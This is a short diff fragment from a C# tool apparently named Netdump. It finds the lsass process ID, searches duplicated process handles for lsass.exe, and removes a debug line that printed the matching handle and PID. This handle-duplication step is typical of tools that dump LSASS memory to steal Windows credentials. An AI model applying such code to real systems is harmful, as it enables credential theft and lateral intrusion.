@@ -469,11 +469,6 @@ if (pathExe.Equals("Process", StringComparison.OrdinalIgnoreCase))
 
 	int lsass_pid = localByName[0].Id;
 
-	if (Netdump.Invokes.GetProcessId(hDuplicate) == lsass_pid)
-	{
-					Console.WriteLine($"[+] {hexValue}, PID: {Netdump.Invokes.GetProcessId(hDuplicate)}");
-	}
-
 	if (Netdump.Invokes.QueryFullProcessImageName(hDuplicate, 0, fileNameBuilder, ref bufferLength))
 	{
 		if (fileNameBuilder.ToString().EndsWith("lsass.exe"))
